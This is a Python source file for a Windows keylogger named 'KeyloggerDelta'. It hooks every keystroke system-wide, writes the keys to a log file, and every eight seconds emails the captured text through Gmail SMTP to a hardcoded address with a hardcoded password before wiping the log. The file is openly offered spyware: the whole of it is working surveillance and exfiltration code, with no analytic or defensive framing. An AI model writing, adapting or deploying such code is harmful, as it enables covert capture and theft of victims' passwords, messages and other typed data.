import pyHook, pythoncom, sys, logging, time, datetime

# Define the destination folder where the keylogger data will be stored
destination_folder = 'C:\\Users\\Windows 11\\Documents\\HK Code\\Python tools\\KeyloggerDelta-2.0V\\KeyloggerDelta v2.6.0'
# Set the wait time in seconds before sending the email
seconds_wait = 8
# Calculate the timeout based on the current time and the wait time
timeout = time.time() + seconds_wait

# Function to check if the timeout has been reached
def TimeOut():
    if time.time() > timeout:
        return True
    else:
        return False

# Function to send an email with the captured keylogger data
def SendEmail():
    with open(destination_folder, 'r+') as f:
        date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read()
        data = data.replace('Space', ' ')
        data = data.replace('\n', '')
        data = 'Message captured at: ' + date + '\n' + data
        print(data)
        createEmail('DeltaLoggerXM@gmail.com', '1234', 'DeltaLoggerXM@gmail.com', 'Delta Captured: ' + date, data)
        f.seek(0)  # Move the file pointer to the beginning of the file
        f.truncate()  # Truncate the file to zero length

# Function to create and send an email
def createEmail(user, passw, recep, subj, body):
    import smtplib
    mailUser = user
    mailPass = passw
    From = user
    To = recep
    Subject = subj
    txt = body

    email = """\From: %s\nTo: %s\nSubject: %s\n\n%s """ % (From, To, Subject, txt)

    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(mailUser, mailPass)
        server.sendmail(From, To, email)
        server.close()  # Corrected from 'coles' to 'close'
        print('Email sent successfully')

    except:
        print('DELTA CAPTURE FAILED')

# Function to handle keyboard events
def OnKeyboardEvent(event):
    logging.basicConfig(filename=destination_folder, level=logging.DEBUG, format='%(message)s')
    print('WindowName:', event.WindowName)
    print('Window:', event.Window)
    print('Key:', event.Key)
    logging.log(10, event.Key)
    return True

# Set up the hook manager to capture keyboard events
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

# Main loop to check for timeout and send email
while True:
    if TimeOut():
        SendEmail()
        timeout = time.time() + seconds_wait

    pythoncom.PumpWaitingMessages()